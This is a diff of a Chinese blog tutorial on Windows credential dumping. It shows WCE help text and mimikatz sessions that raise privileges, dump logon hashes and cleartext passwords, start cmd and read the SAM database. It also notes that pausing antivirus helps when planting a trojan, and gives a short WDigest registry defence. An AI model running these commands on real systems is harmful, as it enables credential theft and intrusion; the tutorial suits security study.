@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-02-14T17:08:00.000Z">
-<meta property="article:modified_time" content="2023-12-09T15:38:12.728Z">
+<meta property="article:modified_time" content="2023-12-12T09:12:24.597Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
@@ -143,8 +143,8 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="nav-text">一、WINDOWS身份认证过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8Cwce-windows-credential-editor"><span class="nav-text">二、WCE (WINDOWS CREDENTIAL
-EDITOR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89wce%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1"><span class="nav-text">三、WCE攻击防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E7%9B%B8%E4%BC%BC%E5%B7%A5%E5%85%B7"><span class="nav-text">四、相似工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwdump"><span class="nav-text">1、pwdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fgdump"><span class="nav-text">2、fgdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz"><span class="nav-text">3、mimikatz</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#windows%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="nav-text">1. WINDOWS身份认证过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wce-windows-credential-editor"><span class="nav-text">2. WCE (WINDOWS CREDENTIAL
+EDITOR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wce%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1"><span class="nav-text">3. WCE攻击防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E4%BC%BC%E5%B7%A5%E5%85%B7"><span class="nav-text">4. 相似工具</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#pwdump"><span class="nav-text">1、pwdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fgdump"><span class="nav-text">2、fgdump</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz"><span class="nav-text">3、mimikatz</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -244,7 +244,7 @@ EDITOR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href=
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-09 23:38:12" itemprop="dateModified" datetime="2023-12-09T23:38:12+08:00">2023-12-09</time>
+      <time title="修改时间：2023-12-12 17:12:24" itemprop="dateModified" datetime="2023-12-12T17:12:24+08:00">2023-12-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -285,14 +285,14 @@ EDITOR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href=
     
     
     
-    <div class="post-body" itemprop="articleBody"><h2 id="一windows身份认证过程">一、WINDOWS身份认证过程</h2>
+    <div class="post-body" itemprop="articleBody"><h2 id="windows身份认证过程">1. WINDOWS身份认证过程</h2>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214183649360-1402844854.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214183705993-1804744301.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214183722335-1848117876.png" /></p>
 <p><strong>账户在登陆的目标服务器/系统后，系统中 </strong>WDisgest
 <strong>安全包会在内存中维护当前处于登录状态账户明文的密码，当注销登陆后才会被删除。
 </strong></p>
-<h2 id="二wce-windows-credential-editor">二、WCE (WINDOWS CREDENTIAL
+<h2 id="wce-windows-credential-editor">2. WCE (WINDOWS CREDENTIAL
 EDITOR</h2>
 <p>Windows Credentials Editor
 (WCE)（windows凭证信息编辑器）是一款功能强大的windows平台内网渗透工具。</p>
@@ -303,40 +303,9 @@ hashes（也可以从交互式登陆、服务、远程桌面连接中获取）�
 <p><strong>要求</strong></p>
 <p>使用需具有管理员权限</p>
 <p><strong>安装</strong></p>
-<pre><code>apt-get install wce  
-root@kali:/usr/share/windows-resources/wce# ls  
-getlsasrvaddr.exe  README  wce32.exe  wce64.exe  wce-universal.exe</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">apt-get install wce  </span><br><span class="line">root@kali:/usr/share/windows-resources/wce<span class="comment"># ls  </span></span><br><span class="line">getlsasrvaddr.exe  README  wce32.exe  wce64.exe  wce-universal.exe</span><br></pre></td></tr></table></figure>
 <p><strong>help</strong></p>
-<pre><code>C:\wce&gt;wce-universal.exe -h
-WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by
-Hernan Ochoa (hernan@ampliasecurity.com)
-Use -h for help.
-Options:
-        -l              List logon sessions and NTLM credentials (default).
-        -s              Changes NTLM credentials of current logon session.
-                        Parameters: &lt;UserName&gt;:&lt;DomainName&gt;:&lt;LMHash&gt;:&lt;NTHash&gt;.
-        -r              Lists logon sessions and NTLM credentials indefinitely.
-                        Refreshes every 5 seconds if new sessions are found.
-                        Optional: -r&lt;refresh interval&gt;.
-        -c              Run &lt;cmd&gt; in a new session with the specified NTLM credentials.
-                        Parameters: &lt;cmd&gt;.
-        -e              Lists logon sessions NTLM credentials indefinitely.
-                        Refreshes every time a logon event occurs.
-        -o              saves all output to a file.
-                        Parameters: &lt;filename&gt;.
-        -i              Specify LUID instead of use current logon session.
-                        Parameters: &lt;luid&gt;.
-        -d              Delete NTLM credentials from logon session.
-                        Parameters: &lt;luid&gt;.
-        -a              Use Addresses.
-                        Parameters: &lt;addresses&gt;
-        -f              Force &#39;safe mode&#39;.
-        -g              Generate LM &amp; NT Hash.
-                        Parameters: &lt;password&gt;.
-        -K              Dump Kerberos tickets to file (unix &amp; &#39;windows wce&#39; format)
-        -k              Read Kerberos tickets from file and insert into Windowscache
-        -w              Dump cleartext passwords stored by the digest authentication package
-        -v              verbose output.</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C:\wce&gt;wce-universal.exe -h</span><br><span class="line">WCE v1.41beta (Windows Credentials Editor) - (c) 2010-2013 Amplia Security - by</span><br><span class="line">Hernan Ochoa (hernan@ampliasecurity.com)</span><br><span class="line">Use -h <span class="keyword">for</span> <span class="built_in">help</span>.</span><br><span class="line">Options:</span><br><span class="line">        -l              List logon sessions and NTLM credentials (default).</span><br><span class="line">        -s              Changes NTLM credentials of current logon session.</span><br><span class="line">                        Parameters: &lt;UserName&gt;:&lt;DomainName&gt;:&lt;LMHash&gt;:&lt;NTHash&gt;.</span><br><span class="line">        -r              Lists logon sessions and NTLM credentials indefinitely.</span><br><span class="line">                        Refreshes every 5 seconds <span class="keyword">if</span> new sessions are found.</span><br><span class="line">                        Optional: -r&lt;refresh interval&gt;.</span><br><span class="line">        -c              Run &lt;cmd&gt; <span class="keyword">in</span> a new session with the specified NTLM credentials.</span><br><span class="line">                        Parameters: &lt;cmd&gt;.</span><br><span class="line">        -e              Lists logon sessions NTLM credentials indefinitely.</span><br><span class="line">                        Refreshes every time a logon event occurs.</span><br><span class="line">        -o              saves all output to a file.</span><br><span class="line">                        Parameters: &lt;filename&gt;.</span><br><span class="line">        -i              Specify LUID instead of use current logon session.</span><br><span class="line">                        Parameters: &lt;luid&gt;.</span><br><span class="line">        -d              Delete NTLM credentials from logon session.</span><br><span class="line">                        Parameters: &lt;luid&gt;.</span><br><span class="line">        -a              Use Addresses.</span><br><span class="line">                        Parameters: &lt;addresses&gt;</span><br><span class="line">        -f              Force <span class="string">&#x27;safe mode&#x27;</span>.</span><br><span class="line">        -g              Generate LM &amp; NT Hash.</span><br><span class="line">                        Parameters: &lt;password&gt;.</span><br><span class="line">        -K              Dump Kerberos tickets to file (unix &amp; <span class="string">&#x27;windows wce&#x27;</span> format)</span><br><span class="line">        -k              Read Kerberos tickets from file and insert into Windowscache</span><br><span class="line">        -w              Dump cleartext passwords stored by the digest authentication package</span><br><span class="line">        -v              verbose output.</span><br></pre></td></tr></table></figure>
 <p><strong>参数：</strong></p>
 <p><strong>-l
 ：查看当前登录账号的密码的密文形式的哈希值【lmhash：nthash】</strong></p>
@@ -367,10 +336,10 @@ Options:
 <p><strong>参数 -i + -s（修改指定会话的登录信息）：</strong></p>
 <p><strong>如：将 a 的登录会话修改成 administrator 账号</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214234734619-1477499615.png" /></p>
-<h2 id="三wce攻击防御">三、WCE攻击防御</h2>
+<h2 id="wce攻击防御">3. WCE攻击防御</h2>
 <p><strong>由于系统是通过 Digest Authentication Package
 在内存中维护明文密码，默认自启动，为此可去注册表中关闭默认启动。</strong></p>
-<p><strong>注册表路径：HKEY_LOCAL_MACHINE Packages</strong></p>
+<p>**注册表路径：HKEY_LOCAL_MACHINE*</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215003608387-1653855160.png" /></p>
 <p><strong>Security Packages默认项：</strong></p>
 <ul>
@@ -381,7 +350,7 @@ Options:
 <li><strong>tspkg 远程终端维护……</strong></li>
 <li>pku2u</li>
 </ul>
-<h2 id="四相似工具">四、相似工具</h2>
+<h2 id="相似工具">4. 相似工具</h2>
 <h3 id="pwdump">1、pwdump</h3>
 <p><strong>参见：</strong><a
 target="_blank" rel="noopener" href="https://www.cnblogs.com/z9m8r8/articles/15892054.html"
@@ -395,225 +364,31 @@ class="uri">https://www.cnblogs.com/z9m8r8/articles/15892054.html</a></p>
 <p><strong>Kali 路径：</strong>
 /usr/share/windows-resources/mimikatz</p>
 <p><strong>帮助信息（用双冒号查看命令模块和子模块）</strong></p>
-<pre><code>**C:\Documents and Settings\Administrator\Desktop\mimikatz\Win32 &gt;** **mimikatz.exe**
-
-  .#####.   mimikatz 2.2.0 (x86) #18362 May 13 2019 01:34:39
- .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)
- ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
- ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
- &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
-  &#39;#####&#39;        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/ **mimikatz # ::**
-ERROR mimikatz_doLocal ; &quot;&quot; module not found !
-
-        standard  -  Standard module  [Basic commands (does not require module name)]
-          crypto  -  Crypto Module
-        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
-        kerberos  -  Kerberos package module  []
-       privilege  -  Privilege module
-         process  -  Process module
-         service  -  Service module
-         lsadump  -  LsaDump module
-              ts  -  Terminal Server module
-           event  -  Event module
-            misc  -  Miscellaneous module
-           token  -  Token manipulation module
-           vault  -  Windows Vault/Credential module
-     minesweeper  -  MineSweeper module
-             net  -
-           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
-       busylight  -  BusyLight Module
-          sysenv  -  System Environment Value module
-             sid  -  Security Identifiers module
-             iis  -  IIS XML Config module
-             rpc  -  RPC control of mimikatz
-            sr98  -  RF module for SR98 device and T5577 target
-             rdm  -  RF module for RDM(830 AL) device
-             acr  -  ACR Module</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">**C:\Documents and Settings\Administrator\Desktop\mimikatz\Win32 &gt;** **mimikatz.exe**</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #18362 May 13 2019 01:34:39</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/ **mimikatz <span class="comment"># ::**</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">        standard  -  Standard module  [Basic commands (does not require module name)]</span><br><span class="line">          crypto  -  Crypto Module</span><br><span class="line">        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]</span><br><span class="line">        kerberos  -  Kerberos package module  []</span><br><span class="line">       privilege  -  Privilege module</span><br><span class="line">         process  -  Process module</span><br><span class="line">         service  -  Service module</span><br><span class="line">         lsadump  -  LsaDump module</span><br><span class="line">              ts  -  Terminal Server module</span><br><span class="line">           event  -  Event module</span><br><span class="line">            misc  -  Miscellaneous module</span><br><span class="line">           token  -  Token manipulation module</span><br><span class="line">           vault  -  Windows Vault/Credential module</span><br><span class="line">     minesweeper  -  MineSweeper module</span><br><span class="line">             net  -</span><br><span class="line">           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]</span><br><span class="line">       busylight  -  BusyLight Module</span><br><span class="line">          sysenv  -  System Environment Value module</span><br><span class="line">             sid  -  Security Identifiers module</span><br><span class="line">             iis  -  IIS XML Config module</span><br><span class="line">             rpc  -  RPC control of mimikatz</span><br><span class="line">            sr98  -  RF module <span class="keyword">for</span> SR98 device and T5577 target</span><br><span class="line">             rdm  -  RF module <span class="keyword">for</span> RDM(830 AL) device</span><br><span class="line">             acr  -  ACR Module</span><br></pre></td></tr></table></figure>
 <p><strong>privilege模块：提权</strong></p>
-<pre><code>mimikatz # privilege::
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;privilege&quot; module not found !
-
-Module :        privilege
-Full name :     Privilege module
-
-           debug  -  Ask debug privilege
-          driver  -  Ask load driver privilege
-        security  -  Ask security privilege
-             tcb  -  Ask tcb privilege
-          backup  -  Ask backup privilege
-         restore  -  Ask restore privilege
-          sysenv  -  Ask system environment privilege
-              id  -  Ask a privilege by its id
-            name  -  Ask a privilege by its name
-
-mimikatz # privilege::debug 　　#提权到debug
-Privilege &#39;20&#39; OK</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># privilege::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;privilege&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        privilege</span><br><span class="line">Full name :     Privilege module</span><br><span class="line"></span><br><span class="line">           debug  -  Ask debug privilege</span><br><span class="line">          driver  -  Ask load driver privilege</span><br><span class="line">        security  -  Ask security privilege</span><br><span class="line">             tcb  -  Ask tcb privilege</span><br><span class="line">          backup  -  Ask backup privilege</span><br><span class="line">         restore  -  Ask restore privilege</span><br><span class="line">          sysenv  -  Ask system environment privilege</span><br><span class="line">              <span class="built_in">id</span>  -  Ask a privilege by its <span class="built_in">id</span></span><br><span class="line">            name  -  Ask a privilege by its name</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug 　　#提权到debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br></pre></td></tr></table></figure>
 <p><strong>sekurlsa模块：查看登录账号密码信息等</strong></p>
-<pre><code>**mimikatz # sekurlsa::**
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;sekurlsa&quot; module not found !
-
-Module :        sekurlsa
-Full name :     SekurLSA module
-Description :   Some commands to enumerate credentials...
-
-             msv  -  Lists LM &amp; NTLM credentials
-         wdigest  -  Lists WDigest credentials
-        kerberos  -  Lists Kerberos credentials
-           tspkg  -  Lists TsPkg credentials
-         livessp  -  Lists LiveSSP credentials
-             ssp  -  Lists SSP credentials
-  logonPasswords  -  Lists all available providers credentials
-         process  -  Switch (or reinit) to LSASS process  context
-        minidump  -  Switch (or reinit) to LSASS minidump context
-             pth  -  Pass-the-hash
-          krbtgt  -  krbtgt!
-     dpapisystem  -  DPAPI_SYSTEM secret
-         tickets  -  List Kerberos tickets
-           ekeys  -  List Kerberos Encryption Keys
-           dpapi  -  List Cached MasterKeys
-         credman  -  List Credentials Manager
-
-**mimikatz # sekurlsa::logonPasswords**
-
-Authentication Id : 0 ; 242726 (00000000:0003b426)
-Session           : Interactive from 0
-User Name         : Administrator
-Domain            : DH-CA8822AB9589
-Logon Server      : DH-CA8822AB9589
-Logon Time        : 2/15/2022 9:14:59 AM
-SID               : S-1-5-21-583907252-1757981266-1177238915-500
-        msv :
-         [00000002] Primary
-         * Username : Administrator
-         * Domain   : DH-CA8822AB9589
-         * LM       : 44efce164ab921caaad3b435b51404ee
-         * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4
-         * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f
-        wdigest :
-         * Username : Administrator
-         * Domain   : DH-CA8822AB9589
-         * Password : 123456
-        kerberos :
-         * Username : Administrator
-         * Domain   : DH-CA8822AB9589
-         * Password : 123456
-        ssp :
-        credman :
-
-Authentication Id : 0 ; 997 (00000000:000003e5)
-Session           : Service from 0
-User Name         : LOCAL SERVICE
-Domain            : NT AUTHORITY
-Logon Server      : (null)
-Logon Time        : 2/15/2022 9:08:41 AM
-SID               : S-1-5-19
-        msv :
-…………………………</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">**mimikatz <span class="comment"># sekurlsa::**</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;sekurlsa&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        sekurlsa</span><br><span class="line">Full name :     SekurLSA module</span><br><span class="line">Description :   Some commands to enumerate credentials...</span><br><span class="line"></span><br><span class="line">             msv  -  Lists LM &amp; NTLM credentials</span><br><span class="line">         wdigest  -  Lists WDigest credentials</span><br><span class="line">        kerberos  -  Lists Kerberos credentials</span><br><span class="line">           tspkg  -  Lists TsPkg credentials</span><br><span class="line">         livessp  -  Lists LiveSSP credentials</span><br><span class="line">             ssp  -  Lists SSP credentials</span><br><span class="line">  logonPasswords  -  Lists all available providers credentials</span><br><span class="line">         process  -  Switch (or reinit) to LSASS process  context</span><br><span class="line">        minidump  -  Switch (or reinit) to LSASS minidump context</span><br><span class="line">             pth  -  Pass-the-hash</span><br><span class="line">          krbtgt  -  krbtgt!</span><br><span class="line">     dpapisystem  -  DPAPI_SYSTEM secret</span><br><span class="line">         tickets  -  List Kerberos tickets</span><br><span class="line">           ekeys  -  List Kerberos Encryption Keys</span><br><span class="line">           dpapi  -  List Cached MasterKeys</span><br><span class="line">         credman  -  List Credentials Manager</span><br><span class="line"></span><br><span class="line">**mimikatz <span class="comment"># sekurlsa::logonPasswords**</span></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 242726 (00000000:0003b426)</span><br><span class="line">Session           : Interactive from 0</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : DH-CA8822AB9589</span><br><span class="line">Logon Server      : DH-CA8822AB9589</span><br><span class="line">Logon Time        : 2/15/2022 9:14:59 AM</span><br><span class="line">SID               : S-1-5-21-583907252-1757981266-1177238915-500</span><br><span class="line">        msv :</span><br><span class="line">         [00000002] Primary</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : DH-CA8822AB9589</span><br><span class="line">         * LM       : 44efce164ab921caaad3b435b51404ee</span><br><span class="line">         * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line">         * SHA1     : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f</span><br><span class="line">        wdigest :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : DH-CA8822AB9589</span><br><span class="line">         * Password : 123456</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : Administrator</span><br><span class="line">         * Domain   : DH-CA8822AB9589</span><br><span class="line">         * Password : 123456</span><br><span class="line">        ssp :</span><br><span class="line">        credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2/15/2022 9:08:41 AM</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">        msv :</span><br><span class="line">…………………………</span><br></pre></td></tr></table></figure>
 <p><strong>process模块：管理进程</strong></p>
-<pre><code>mimikatz # process::
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;process&quot; module not found !
-
-Module :        process
-Full name :     Process module
-
-            list  -  List process
-         exports  -  List exports
-         imports  -  List imports
-           start  -  Start a process
-            stop  -  Terminate a process
-         suspend  -  Suspend a process
-          resume  -  Resume a process
-             run  -  Run!
-            runp  -
-mimikatz # process::start cmd
-Trying to start &quot;cmd&quot; : OK ! (PID 3888)</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># process::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;process&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        process</span><br><span class="line">Full name :     Process module</span><br><span class="line"></span><br><span class="line">            list  -  List process</span><br><span class="line">         exports  -  List exports</span><br><span class="line">         imports  -  List imports</span><br><span class="line">           start  -  Start a process</span><br><span class="line">            stop  -  Terminate a process</span><br><span class="line">         <span class="built_in">suspend</span>  -  Suspend a process</span><br><span class="line">          resume  -  Resume a process</span><br><span class="line">             run  -  Run!</span><br><span class="line">            runp  -</span><br><span class="line">mimikatz <span class="comment"># process::start cmd</span></span><br><span class="line">Trying to start <span class="string">&quot;cmd&quot;</span> : OK ! (PID 3888)</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220215095339100-220935767.png" /></p>
 <p><strong>service模块：服务管理</strong></p>
-<pre><code>mimikatz # service::
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;service&quot; module not found !
-
-Module :        service
-Full name :     Service module
-
-           start  -  Start service
-          remove  -  Remove service
-            stop  -  Stop service
-         suspend  -  Suspend service
-          resume  -  Resume service
-     preshutdown  -  Preshutdown service
-        shutdown  -  Shutdown service
-            list  -  List services
-               +  -  Install Me!
-               -  -  Install Me!
-              me  -  Me!</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># service::</span></span><br><span class="line">ERROR mimikatz_doLocal ; <span class="string">&quot;(null)&quot;</span> <span class="built_in">command</span> of <span class="string">&quot;service&quot;</span> module not found !</span><br><span class="line"></span><br><span class="line">Module :        service</span><br><span class="line">Full name :     Service module</span><br><span class="line"></span><br><span class="line">           start  -  Start service</span><br><span class="line">          remove  -  Remove service</span><br><span class="line">            stop  -  Stop service</span><br><span class="line">         <span class="built_in">suspend</span>  -  Suspend service</span><br><span class="line">          resume  -  Resume service</span><br><span class="line">     preshutdown  -  Preshutdown service</span><br><span class="line">        shutdown  -  Shutdown service</span><br><span class="line">            list  -  List services</span><br><span class="line">               +  -  Install Me!</span><br><span class="line">               -  -  Install Me!</span><br><span class="line">              me  -  Me!</span><br></pre></td></tr></table></figure>
 <p><strong>suspend子模块：挂起进程，可用于植入木马时，暂停防病毒软件。</strong></p>
 <p><strong>resume子模块：进程恢复</strong></p>
-<p><strong>lsadump模块 </strong></p>
-<pre><code>mimikatz # lsadump::
-ERROR mimikatz_doLocal ; &quot;(null)&quot; command of &quot;lsadump&quot; module not found !
-
-Module :        lsadump
-Full name :     LsaDump module
-
-             sam  -  Get the SysKey to decrypt SAM entries (from registry or hives)
-         secrets  -  Get the SysKey to decrypt SECRETS entries (from registry or hives)
-           cache  -  Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)
-             lsa  -  Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)
-           trust  -  Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly)
-      backupkeys
-          rpdata
-          dcsync  -  Ask a DC to synchronize an object
-        dcshadow  -  They told me I could be anything I wanted, so I became a domain controller
-         setntlm  -  Ask a server to set a new password/ntlm for one user
-      changentlm  -  Ask a server to set a new password/ntlm for one user
-         netsync  -  Ask a DC to send current and previous NTLM hash of DC/SRV/WKS
-        packages
-
-mimikatz # lsadump::sam　　　　#从SAM数据库中读取账号密码
-Domain : DH-CA8822AB9589
-SysKey : 7be839f49edcab29c3a40fe24d47335f
